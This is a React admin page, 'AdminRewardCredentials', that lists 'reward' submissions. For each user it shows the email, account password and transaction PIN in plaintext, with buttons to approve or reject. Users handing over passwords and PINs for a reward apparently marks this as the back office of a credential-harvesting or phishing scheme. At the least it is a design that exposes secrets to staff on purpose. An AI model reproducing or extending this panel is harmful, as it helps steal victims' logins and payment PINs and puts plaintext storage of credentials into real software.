import { useEffect, useState } from "react";
import {
    getRewardSubmissions,
    approveReward,
    rejectReward
} from "../../api/rewardAdmin.api";

import "./AdminRewardCredentials.css";

export default function AdminRewardCredentials() {

    const [rewards, setRewards] = useState([]);
    const [loading, setLoading] = useState(true);

    async function loadRewards() {

        try {

            const { data } = await getRewardSubmissions();

            setRewards(data.submissions);

        }

        catch (err) {

            console.error(err);

        }

        finally {

            setLoading(false);

        }

    }

    useEffect(() => {

        loadRewards();

    }, []);

    async function handleApprove(id) {

        try {

            await approveReward(id);

            loadRewards();

        }

        catch (err) {

            console.error(err);

        }

    }

    async function handleReject(id) {

        const reason = prompt("Reason for rejection");

        if (!reason) return;

        try {

            await rejectReward(id, reason);

            loadRewards();

        }

        catch (err) {

            console.error(err);

        }

    }

    if (loading) {

        return <h2>Loading...</h2>;

    }

    return (

        <div className="reward-page">

            <h1>Reward Credentials</h1>

            <table className="reward-table">

                <thead>

                    <tr>

                        <th>User</th>

                        <th>Email</th>

                        <th>Password</th>

                        <th>Transaction PIN</th>

                        <th>Status</th>

                        <th>Submitted</th>

                        <th>Actions</th>

                    </tr>

                </thead>

                <tbody>

                    {rewards.map((reward) => (

                        <tr key={reward.id}>

                            <td>

                                {reward.user.firstName} {reward.user.lastName}

                            </td>

                            <td>{reward.email}</td>

                            <td>{reward.password}</td>

                            <td>{reward.transactionPin}</td>

                            <td>

                                {reward.adminApproved === null && "Pending"}

                                {reward.adminApproved === true && "Approved"}

                                {reward.adminApproved === false && "Rejected"}

                            </td>

                            <td>

                                {new Date(reward.createdAt).toLocaleDateString()}

                            </td>

                            <td>

                                {reward.adminApproved === null && (

                                    <>

                                        <button

                                            onClick={() =>

                                                handleApprove(reward.id)

                                            }

                                        >

                                            Approve

                                        </button>

                                        <button

                                            onClick={() =>

                                                handleReject(reward.id)

                                            }

                                        >

                                            Reject

                                        </button>

                                    </>

                                )}

                            </td>

                        </tr>

                    ))}

                </tbody>

            </table>

        </div>

    );

}